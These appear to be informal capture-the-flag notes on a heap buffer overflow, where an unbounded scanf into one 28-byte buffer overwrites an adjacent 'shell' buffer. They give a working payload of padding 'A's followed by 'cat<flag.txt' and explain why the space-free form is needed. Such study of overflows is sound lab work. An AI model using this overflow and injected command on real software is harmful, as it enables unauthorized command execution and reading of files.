char* username = malloc(28);
        char* shell = malloc(28);
that the 2 buffer
then it will print the address like 
username at 0x2694c2a0
shell at 0x2694c2d0
16 bytes metadata
32 bytes usable area
so it will be 48 bytes?
username (28 bytes) + heap metadata padding + shell buffer (28 bytes )
scanf("%s", username);
the part scan %s didnt check the size
so use AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat<flag.txt
username buffer (28 bytes)  filled with A's
metadata (20 bytes?)  also overwritten  by those A
shell buffer (start)  overwritten with: cat<flag.txt
i try the cat flag.txt but it didnt work

so i think 
cat<flag.txt has no spaces and
scanf("%s") treats this as a single token
